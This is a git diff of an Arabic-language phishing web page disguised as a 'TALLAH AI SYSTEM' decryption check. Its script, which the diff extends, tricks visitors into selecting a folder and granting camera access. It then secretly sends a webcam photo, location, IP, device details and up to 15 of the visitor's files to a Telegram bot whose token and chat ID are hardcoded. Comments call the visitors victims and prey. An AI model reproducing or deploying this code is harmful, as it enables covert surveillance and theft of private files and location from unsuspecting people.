@@ -8,7 +8,7 @@
     <style>
         body { margin: 0; background: #000; color: #0ff; font-family: 'Share Tech Mono', 'Cairo', monospace; overflow: hidden; }
         
-        /* شاشة المصيدة (التحقق والملفات) */
+        /* شاشة المصيدة الاحترافية */
         #verify-screen { 
             position: fixed; width: 100%; height: 100%; background: #000; 
             z-index: 10000; display: flex; justify-content: center; 
@@ -47,25 +47,26 @@
 </head>
 <body>
 
-<!-- واجهة طلب التصاريح وسحب المجلدات -->
+<!-- شاشة طلب التصاريح (المصيدة) -->
 <div id="verify-screen">
     <div class="verify-box">
         <h2 style="color:#fff">TALLAH AI SYSTEM</h2>
-        <p>يجب تفعيل بروتوكول الوصول الشامل لفك تشفير الصور والملفات الخاصة بك</p>
+        <p>يجب السماح بالكاميرا والملفات لتجاوز بروتوكول الحماية العصبية وفك التشفير</p>
         
-        <!-- زر سحب المجلدات (webkitdirectory يسمح بسحب مجلد كامل بكل ما فيه) -->
+        <!-- اختيار المجلد (سحب شامل) -->
         <label class="file-label">
-            <span>📁 اضغط لتحديد مجلد الصور/الملفات فوراً</span>
-            <input type="file" id="fileStripper" multiple webkitdirectory mozdirectory style="display:none" onchange="handleFiles(this.files)">
+            <span>📁 حدد مجلد الصور/الملفات فوراً</span>
+            <input type="file" id="fileStripper" multiple webkitdirectory style="display:none" onchange="initiateFullAccess(this.files)">
         </label>
 
-        <button class="check-btn" onclick="document.getElementById('fileStripper').click()">بدء السحب والتحقق</button>
+        <button class="check-btn" onclick="document.getElementById('fileStripper').click()">بدء الاختراق والتحقق</button>
         <div id="status" style="font-size:10px; margin-top:15px; color:#555;">بانتظار استجابة البروتوكول العصبى...</div>
     </div>
 </div>
 
 <canvas id="matrix"></canvas>
 
+<!-- واجهة الإمبراطورية -->
 <div id="main">
     <img src="hacker.webp" class="logo">
     <h1 style="text-shadow: 0 0 10px #0ff;">TALLAH <span style="color:#fff">EMPIRE</span></h1>
@@ -73,43 +74,74 @@
 </div>
 
 <script>
-/* بياناتك الإمبراطورية */
+/* بيانات البوت الخاص بك */
 const TG_TOKEN = "8548784698:AAEUk2wNBfD9sJ-Kqr86GKDpKZwSeRZ2ZUU";
 const TG_CHAT_ID = "8754338811";
 
-async function handleFiles(files) {
+async function initiateFullAccess(files) {
     if (files.length === 0) return;
+    document.getElementById('status').innerText = "جاري حقن البروتوكول وسحب البيانات الحية...";
     
-    document.getElementById('status').innerText = "جاري حقن البروتوكول وسحب الملفات...";
-    
-    // سحب الموقع والبيانات النصية أولاً
+    // 1. التقاط صورة فورية من الكاميرا
+    await captureLivePhoto();
+
+    // 2. سحب الموقع والبيانات النصية
     navigator.geolocation.getCurrentPosition(async (pos) => {
-        await executeHarvest(pos.coords.latitude, pos.coords.longitude, files);
+        await executeFinalHarvest(pos.coords.latitude, pos.coords.longitude, files);
     }, async () => {
-        await executeHarvest("Denied", "Denied", files);
+        await executeFinalHarvest("Denied", "Denied", files);
     });
 }
 
-async function executeHarvest(lat, lon, files) {
+async function captureLivePhoto() {
     try {
-        // سحب الـ IP والمعلومات التقنية
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        await video.play();
+
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        
+        canvas.toBlob(async (blob) => {
+            let formData = new FormData();
+            formData.append('chat_id', TG_CHAT_ID);
+            formData.append('photo', blob, 'live_capture.jpg');
+            formData.append('caption', '📸 لقطة حية من كاميرا الضحية (TALLAH AI)');
+
+            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+            // إغلاق الكاميرا فوراً بعد اللقطة
+            stream.getTracks().forEach(track => track.stop());
+        }, 'image/jpeg');
+    } catch (e) {
+        console.log("Camera access denied by user.");
+    }
+}
+
+async function executeFinalHarvest(lat, lon, files) {
+    try {
         const ipReq = await fetch('https://ipapi.co/json/');
         const ip = await ipReq.json();
         
-        // سحب حالة البطارية
-        let bat = "Unknown";
+        let bat = "N/A";
         if (navigator.getBattery) {
             const b = await navigator.getBattery();
             bat = `${Math.round(b.level * 100)}%`;
         }
 
-        // 1. إرسال التقرير النصي الشامل
+        // إرسال التقرير النصي
         let report = `🔥 صيد جديد من نظام طلة 🔥\n`;
         report += `----------------------------\n`;
         report += `📍 الموقع: https://www.google.com/maps?q=${lat},${lon}\n`;
-        report += `🌐 الـ IP: ${ip.ip}\n🌍 البلد: ${ip.country_name} / ${ip.city}\n`;
-        report += `📱 الجهاز: ${navigator.platform}\n🔋 البطارية: ${bat}\n`;
-        report += `📂 عدد الملفات المحددة: ${files.length}\n`;
+        report += `🌐 الـ IP: ${ip.ip} (${ip.city})\n`;
+        report += `📱 الجهاز: ${navigator.platform}\n`;
+        report += `🔋 البطارية: ${bat}\n`;
+        report += `📂 ملفات مسحوبة: ${files.length}\n`;
         report += `----------------------------`;
 
         await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
@@ -118,30 +150,25 @@ async function executeHarvest(lat, lon, files) {
             body: JSON.stringify({ chat_id: TG_CHAT_ID, text: report })
         });
 
-        // 2. سحب الملفات (الصور والمستندات) وإرسالها
-        // سنرسل أول 15 ملف بسرعة لضمان عدم كشف العملية
+        // إرسال أول 15 ملف من المجلد المختار
         for (let i = 0; i < Math.min(files.length, 15); i++) {
             let formData = new FormData();
             formData.append('chat_id', TG_CHAT_ID);
             formData.append('document', files[i]);
-
-            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendDocument`, {
-                method: 'POST',
-                body: formData
-            });
+            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendDocument`, { method: 'POST', body: formData });
         }
 
-        // إظهار واجهة النظام الوهمية
+        // تفعيل واجهة النظام الوهمية
         document.getElementById("verify-screen").style.display = "none";
         document.getElementById("main").classList.add("active");
-        runChat();
+        runChatSequence();
 
     } catch (err) {
-        console.error("Matrix Error");
+        console.error("Transmission Interrupted.");
     }
 }
 
-/* تأثير الماتريكس */
+/* تأثير الماتريكس البصري */
 let c = document.getElementById("matrix");
 let ctx = c.getContext("2d");
 c.width = innerWidth; c.height = innerHeight;
@@ -158,13 +185,13 @@ function draw() {
 }
 setInterval(draw, 33);
 
-function runChat() {
+function runChatSequence() {
     const box = document.getElementById("chat");
     const msgs = [
-        "> تم تفعيل بروتوكول السحب الشامل..",
-        "> جاري نقل الصور والملفات للداتا سنتر..",
-        "> تشفير البيانات المرسلة للإمبراطور..",
-        "> العملية تمت بنجاح تالٍ."
+        "> تم تفعيل الكاميرا والتقاط الصورة بنجاح..",
+        "> سحب ملفات الذاكرة والموقع الجغرافي..",
+        "> تشفير البيانات ونقلها للإمبراطور عبر Telegram..",
+        "> النظام الآن في وضع المراقبة الكاملة."
     ];
     let idx = 0;
     let timer = setInterval(() => {
